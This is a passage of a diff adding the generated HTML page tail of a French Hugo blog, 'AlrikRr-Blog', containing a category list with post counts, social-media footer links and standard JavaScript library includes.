+                <a href="/categories/exploitation-binaire/">exploitation-binaire</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/iot/">iot</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/machine-learning/">machine-learning</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/archlinux/">archlinux</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hacking/">hacking</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/android/">android</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/project/">project</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/raspberry/">raspberry</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/s%C3%A9curit%C3%A9/">sécurité</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  
+  <section id="footer">
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+    <p class="copyright">
+      
+        &copy; 2021
+        
+          AlrikRr-Blog
+        
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+    
+
+    
+      
+    
+
+    
+      
+      
+      
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
+        
+        
+        
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
+        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
+      
+    
+    
+    
+      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
+      <script src="/js/util.js"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/backToTop.js"></script>
+    
+
+    
+      
+        
+      
+    
+
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+      <script src="//yihui.name/js/math-code.js"></script>
+<script async
+src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+  </body>
+</html>
+
